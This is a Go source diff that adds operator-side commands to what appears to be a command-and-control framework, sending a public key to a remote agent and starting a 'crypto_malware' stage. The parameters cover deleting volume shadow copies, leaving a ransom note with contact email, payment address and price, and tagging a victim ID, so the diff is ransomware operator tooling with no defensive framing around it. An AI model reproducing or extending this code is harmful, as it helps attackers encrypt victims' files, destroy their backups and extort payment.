@@ -500,3 +500,32 @@ func (s *Session) SendWirelessStart(sessionID, iface string, channel int) error 
 func (s *Session) SendWirelessStop(sessionID string) error {
 	return s.sendTunnelMsg(proto.TypeWirelessStop, proto.WirelessStop{SessionID: sessionID})
 }
+
+// SendKeyPush delivers a file to the agent. Used to ship the operator public
+// key before a crypto stage. Path is relative to the agent's workdir.
+func (s *Session) SendKeyPush(sessionID, filename string, data []byte) error {
+	return s.sendTunnelMsg(proto.TypeKeyPush, proto.KeyPush{
+		SessionID: sessionID,
+		Filename:  filename,
+		Data:      data,
+		Mode:      0o600,
+	})
+}
+
+// SendCryptoStart kicks off the agent-side crypto_malware stage.
+func (s *Session) SendCryptoStart(sessionID, root string, keyID uint32,
+	dryRun, killVSS, note bool, noteEmail, noteAddr, notePrice, victimID string) error {
+	return s.sendTunnelMsg(proto.TypeCryptoStart, proto.CryptoStart{
+		SessionID:    sessionID,
+		Root:         root,
+		KeyID:        keyID,
+		DryRun:       dryRun,
+		KillVSS:      killVSS,
+		Note:         note,
+		ContactEmail: noteEmail,
+		Address:      noteAddr,
+		Price:        notePrice,
+		VictimID:     victimID,
+	})
+}
+
